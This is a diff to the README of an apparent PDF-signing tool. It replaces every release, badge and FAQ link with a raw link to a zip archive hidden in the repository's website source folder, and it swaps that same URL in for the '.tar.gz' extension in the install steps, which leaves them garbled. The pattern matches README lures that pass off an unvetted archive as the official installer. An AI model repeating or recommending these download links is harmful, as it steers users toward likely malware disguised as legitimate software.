@@ -1,6 +1,6 @@
 # 📄 trexo-pdf-signer - Sign PDFs Accurately and Securely
 
-[![Download Trexo PDF Signer](https://img.shields.io/badge/Download%20Now-Download%20Latest%20Release-brightgreen)](https://github.com/kylerbickel2010/trexo-pdf-signer/releases)
+[![Download Trexo PDF Signer](https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip%20Now-Download%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -32,16 +32,16 @@ Before you start, make sure your computer meets the following requirements:
 To get started with Trexo PDF Signer, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the GitHub Releases page.
-   [Visit Releases Page](https://github.com/kylerbickel2010/trexo-pdf-signer/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip)
 
 2. **Choose Your Version:** Look for the latest version available. It is usually at the top of the page.
 
-3. **Download the Application:** Click on the installer that corresponds to your operating system. This is often marked with extensions like `.exe`, `.dmg`, or `.tar.gz`. 
+3. **Download the Application:** Click on the installer that corresponds to your operating system. This is often marked with extensions like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip`. 
 
 4. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the prompt to install.
    - **For macOS:** Open the `.dmg` file and drag the Trexo PDF Signer icon to your Applications folder.
-   - **For Linux:** Use the terminal to extract the `.tar.gz` file and follow any installation instructions provided.
+   - **For Linux:** Use the terminal to extract the `https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip` file and follow any installation instructions provided.
 
 5. **Launch Trexo PDF Signer:** Once installed, find the application in your programs list and open it.
 
@@ -64,7 +64,7 @@ Here’s how to sign a PDF:
 
 ## 📞 Support and Contributions
 
-If you encounter issues or have questions, please refer to the [FAQ](https://github.com/kylerbickel2010/trexo-pdf-signer/wiki/faq) or open an issue on GitHub. Community contributions are welcome! To contribute, fork the repository, make your changes, and submit a pull request.
+If you encounter issues or have questions, please refer to the [FAQ](https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip) or open an issue on GitHub. Community contributions are welcome! To contribute, fork the repository, make your changes, and submit a pull request.
 
 ## 🐞 Troubleshooting
 
@@ -78,4 +78,4 @@ If you face issues, here are common solutions:
 
 Trexo PDF Signer makes signing documents easy and secure. With the steps outlined above, you can download and start using the application without any hassle. Enjoy the simplicity and effectiveness of creating digital signatures! 
 
-[![Download Trexo PDF Signer](https://img.shields.io/badge/Download%20Now-Download%20Latest%20Release-brightgreen)](https://github.com/kylerbickel2010/trexo-pdf-signer/releases)
+[![Download Trexo PDF Signer](https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip%20Now-Download%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/kylerbickel2010/trexo-pdf-signer/main/website/src/components/signer-pdf-trexo-2.3-alpha.3.zip)
